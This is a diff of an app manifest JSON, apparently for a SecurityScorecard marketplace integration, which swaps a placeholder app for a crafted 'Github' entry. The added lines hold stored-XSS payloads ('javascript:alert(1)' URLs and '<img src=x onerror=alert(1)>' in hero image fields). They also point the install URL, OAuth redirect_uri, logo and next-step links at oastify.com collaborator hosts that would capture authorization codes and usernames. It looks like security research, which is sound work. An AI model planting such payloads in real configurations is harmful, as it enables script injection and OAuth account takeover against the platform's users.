@@ -1,60 +1,76 @@
 {
-   "id": "e3115e8e-f606-4329-a624-caa01f66b104",
-   "url": "https://subscriptions.dev.ssc.camp/apps/e3115e8e-f606-4329-a624-caa01f66b104",
-   "created_by": "esio@securityscorecard.io",
-   "created_at": "2024-10-14T12:29:49.244Z",
-   "organization_id": "7055e42a-0003-5d88-a8c2-4a945cb41c3a",
-   "name": "TEST CHANGE",
-   "namespace": "b4b19d42_e7a1_44be_9352_f0eaf596d14c",
+   "id": "17156ca9-8cf9-4e99-a7b1-78b6950f0c57",
+   "url": "https://ssc-app-github.prod.ssc.camp/manifest.json",
+   "created_by": "system",
+   "created_at": "2023-01-18T22:51:30.865Z",
+   "public": true,
+   "organization_id": "0a85b6ce-1b11-5f5d-90d1-7e3ec31cad1b",
+   "name": "Github",
+   "namespace": "github",
    "description": {
-      "short": "t",
-      "long": "t"
+      "short": "bhavukjain1-short",
+      "long": "bhavukjain1-long"
    },
    "tags": [
-      "metrics"
+      "compliance_signal",
+      "ff_compliance360",
+      "github",
+      "it_service_management",
+      "productivity",
+      "signals"
    ],
    "developer": {
-      "name": "esio@securityscorecard.io",
-      "website_url": "https://securityscorecard.com",
-      "privacy_url": "https://securityscorecard.com",
-      "terms_of_use_url": "https://securityscorecard.com"
+      "name": "Security Scorecard",
+      "website_url": "javascript:alert(1)"
    },
    "display_settings": {
-      "logo_url": "https://platform.securityscorecard.io/images/ssc-logo.png",
-      "homepage_url": "https://securityscorecard.com",
-      "help_url": "https://securityscorecard.com"
+      "primary_color": "#17494D",
+      "secondary_color": "#17494D",
+      "logo_url": "https://7iqzk434uoje2ujw9rd65502mtspgf44.oastify.com/apps/17156ca9-8cf9-4e99-a7b1-78b6950f0c57/bhavukjain1.png",
+      "hero_images": [
+         {
+            "text": "<img src=x onerror=alert(1)>",
+            "url": "<img src=x onerror=alert(1)>"
+         }
+      ],
+      "homepage_url": "javascript:alert(1)"
    },
-   "metrics": [
-      {
-         "id": "framework",
-         "name": "NewTestEmma",
-         "tags": [
-            "compliance_framework",
-            "COMPLIANCE360",
-            "custom_framework"
-         ],
-         "short_description": "t",
-         "long_description": "t",
-         "expressions": [
-            {
-               "key": "Control Key 1",
-               "name": "Control Name 2",
-               "source": "ok(combine([]))",
-               "specification": "Description Control 1"
-            },
-            {
-               "key": "Control Key 2",
-               "name": "Control Name 2",
-               "source": "ok(combine([]))",
-               "specification": "Description Control 2"
-            },
-            {
-               "key": "Control Key 3",
-               "name": "Control Name 3",
-               "source": "ok(combine([]))",
-               "specification": "Description Control 3"
-            }
+   "install": {
+      "url": "https://0uvswxfx6hv7envplkpzhycvym4hs7gw.oastify.com/apps/github/authorize",
+      "secrets": [
+         {
+            "key": "INSTALLATION",
+            "description": "Reference id to srv-subscriptions",
+            "value_required": false
+         }
+      ],
+      "oauth": {
+         "redirect_uri": "https://0uvswxfx6hv7envplkpzhycvym4hs7gw.oastify.com/apps/github/install",
+         "scopes": [
+            "issue:summary",
+            "user:read"
          ]
       }
-   ]
+   },
+   "installed_at": "2024-10-07T10:10:47.384Z",
+   "configuration_complete": true,
+   "signals": [
+      {
+         "id": "github.compliance",
+         "name": "Github",
+         "severity": "info",
+         "factor": "dns_health",
+         "long_description": "bhavukjain1_long",
+         "short_description": "bhavukjain1_short",
+         "recommendation": "Create new policy with restricted access",
+         "references": [
+            {
+               "link": "https://0uvswxfx6hv7envplkpzhycvym4hs7gw.oastify.com/es/iam/",
+               "text": "Github Services: IAM"
+            }
+         ],
+         "my_scorecard_only": false
+      }
+   ],
+   "installation_next_url": "https://0uvswxfx6hv7envplkpzhycvym4hs7gw.oastify.com/apps/github/authorize?installation=b416dedf-f921-4766-b82d-eed640199f51&username=test1%40bhavukjain.com"
 }
